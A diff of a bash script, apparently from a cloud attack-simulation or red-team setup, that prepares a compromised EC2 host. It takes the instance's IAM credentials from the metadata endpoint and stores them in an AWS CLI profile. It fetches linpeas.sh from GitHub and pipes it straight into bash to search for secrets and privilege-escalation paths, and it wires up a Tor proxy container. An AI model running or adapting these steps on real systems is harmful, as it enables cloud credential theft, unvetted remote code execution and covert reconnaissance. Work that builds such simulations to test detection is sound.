@@ -9,13 +9,6 @@ function log {
 MAXLOG=2
 for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
 mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
-check_apt() {
-  pgrep -f "apt" || pgrep -f "dpkg"
-}
-while check_apt; do
-  log "Waiting for apt to be available..."
-  sleep 10
-done
 
 log "Checking for aws cli..."
 while ! which aws > /dev/null; do
@@ -24,12 +17,31 @@ while ! which aws > /dev/null; do
 done
 log "aws path: $(which aws)"
 
-log "installing jq..."
-apt-get install -y jq
-
 REGION=${region}
 ENVIRONMENT=target
 DEPLOYMENT=${deployment}
+
+opts="--no-cli-pager"
+
+log "Downloading jq..."
+curl -LJ -o /usr/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 /usr/bin/jq
+
+#######################
+# tor environment setup
+#######################
+
+TORPROXY=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' torproxy)
+log "TORPROXY: $TORPROXY"
+
+#######################
+# aws cred setup
+#######################
+
+log "Running: aws sts get-caller-identity --profile=$PROFILE"
+aws sts get-caller-identity --profile=$PROFILE $opts >> $LOGFILE 2>&1
+
+
+....
 
 INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
 AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
@@ -48,30 +60,19 @@ EOF
 
 log "Setting up a instance profile with aws cli"
 PROFILE="instance"
-aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
-aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
-aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE
-aws configure set region $REGION --profile=$PROFILE
-aws configure set output json --profile=$PROFILE
+aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE $opts
+aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE $opts
+aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE $opts
+aws configure set region $REGION --profile=$PROFILE $opts
+aws configure set output json --profile=$PROFILE $opts
 
 log "Running: aws sts get-caller-identity --profile=$PROFILE"
-aws sts get-caller-identity --profile=$PROFILE >> $LOGFILE 2>&1
+aws sts get-caller-identity --profile=$PROFILE $opts >> $LOGFILE 2>&1
 
 # local discovery
 log "Running local discovery..."
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex >> $LOGFILE 2>&1
 log "done."
-
-# cloud discovery
-# log "Running cloud discovery..."
-# docker run --rm --name=scoutsuite --env-file=.aws-ec2-instance rossja/ncc-scoutsuite:aws-latest scout aws
-# log "done."
-# reset docker containers
-log "Stopping and removing any existing tor containers..."
-docker stop torproxy > /dev/null 2>&1
-docker rm torproxy > /dev/null 2>&1
-docker stop proxychains-scoutsuite-aws > /dev/null 2>&1
-docker rm proxychains-scoutsuite-aws > /dev/null 2>&1
 
 # start tor proxy
 log "Starting tor proxy..."
